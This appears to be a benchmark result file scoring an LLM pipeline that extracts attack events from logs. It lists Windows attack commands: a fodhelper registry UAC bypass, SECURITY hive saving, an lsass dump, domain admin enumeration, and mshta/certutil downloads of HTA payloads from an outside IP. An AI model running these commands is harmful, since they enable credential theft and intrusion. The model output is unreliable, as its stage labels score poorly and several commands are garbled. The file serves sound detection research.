@@ -1,0 +1,152 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C '.\\T1059.003_script.bat'",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \" Invoke-AtomicTest T1134.001 -TestNumbers 1\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"$input_table = \\",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"echo test >> test.exe\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1003.003\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"{New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\"\" -Force New-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\"\" -Name \"DelegateExecute\"\" -Value \"\"\" -Force Set-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\"\" -Name \"(default)\"\" -Value \"C:\\Windows\\System32\\cmd.exe\"\" -Force\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"{Start-Process \"C:\\Windows\\System32\\fodhelper.exe}\"}",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /c reg.exe save hklm\\security c:\\users\\admini~1\\appdata\\local\\temp\\tjbvkjpetfjp\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "cmd.exe /C prosdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp ",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"net group \"domain admins\" /domain\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1119\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1059.005  -TestNumbers 1\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "mshta.exe http://124.223.85.207:8082/T1218.005.hta",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil -urlcache -split -f  http://124.223.85.207:8082/Test.hta",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powerpsexec c:\\path\\to\\downloaded_payload.exe",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"\\.\\\\chromeRemoteServices.ps1\"",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "C:\\Users\\Administrator\\Desktop\\shell\\T1059.006.py",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "C:\\Users\\Administrator\\Desktop\\shell\\T1059.006.py",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "C:\\Users\\Administrator\\Desktop\\shell\\T1059.006.py",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1548.002 -TestNumbers 2\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \\\"application/json\\\"\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "notepad.exe",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "notepad.exe",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "notepad.exe",
+        "stage": "Lateral Movement"
+      }
+    ],
+    "narrative": "A coordinated cyberattack was launched targeting a victim organization. Initially, attackers gained entry through several vectors, including phishing emails containing malicious Python scripts and exploits against vulnerabilities in Microsoft Edge browser. Following initial access, attackers leveraged living-off-the-land tactics, utilizing existing Windows binaries like PowerShell and Cmd.exe to carry out reconnaissance, establish persistent backdoors, escalate privileges, steal sensitive information, communicate with attackers remotely through HTA files, and conduct further attacks. Throughout the campaign, actors demonstrated sophisticated techniques to evade detection, leveraging legitimate software packages and taking advantage of Windows features.",
+    "_parse_ok": false,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 88384,
+      "completion_tokens": 6880,
+      "total_tokens": 95264,
+      "wall_clock_s": 102.32,
+      "parse_retries": 1
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.36,
+      "recall": 0.23684210526315788,
+      "f1": 0.2857142857142857,
+      "tp": 9,
+      "fp": 16,
+      "fn": 29
+    },
+    "stage": {
+      "precision": 0.08,
+      "recall": 0.05263157894736842,
+      "f1": 0.06349206349206349,
+      "tp": 2,
+      "fp": 23,
+      "fn": 36,
+      "recall_partial": 0.12162162162162163
+    },
+    "hallucination_rate": 0.16666666666666666,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 88384,
+      "completion_tokens": 6880,
+      "total_tokens": 95264,
+      "wall_clock_s": 102.32,
+      "parse_retries": 1
+    }
+  },
+  "meta": {
+    "variant": "v5_got_links",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": true
+  }
+}
